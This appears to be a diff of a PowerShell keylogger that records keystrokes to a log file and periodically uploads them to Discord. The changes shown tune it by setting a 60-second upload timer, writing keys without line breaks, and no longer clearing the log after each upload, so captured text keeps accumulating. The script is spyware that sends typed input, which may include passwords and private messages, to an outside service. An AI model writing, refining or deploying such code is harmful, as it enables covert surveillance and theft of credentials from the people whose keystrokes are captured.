@@ -29,12 +29,9 @@ if (-not (Test-Path -Path $logFilePath)) {
     }
 }
 
-# Initialize the keylog buffer
-$keylog = ""
-
 # Create a timer to upload keylog to Discord every minute
 $timer = New-Object System.Timers.Timer
-$timer.Interval = 10000  # 10000 ms = 10 seconds
+$timer.Interval = 60000  # 60000 ms = 60 seconds
 
 # Define the timer action
 $timerAction = {
@@ -59,7 +56,7 @@ while ($true) {
         $key = $keyInfo.KeyChar
 
         # Log the key
-        Add-Content -Path $logFilePath -Value $key
+        Add-Content -Path $logFilePath -Value $key -NoNewline
         $lastKeystrokeTime = [System.DateTime]::Now
     }
 
@@ -68,7 +65,6 @@ while ($true) {
     if ($elapsedTime.TotalSeconds -ge 60) {
         $text = Get-Content -Path $logFilePath
         Upload-Discord -text $text
-        Clear-Content -Path $logFilePath
     }
 
     # Check if Ctrl+Alt+0 is pressed to stop the script
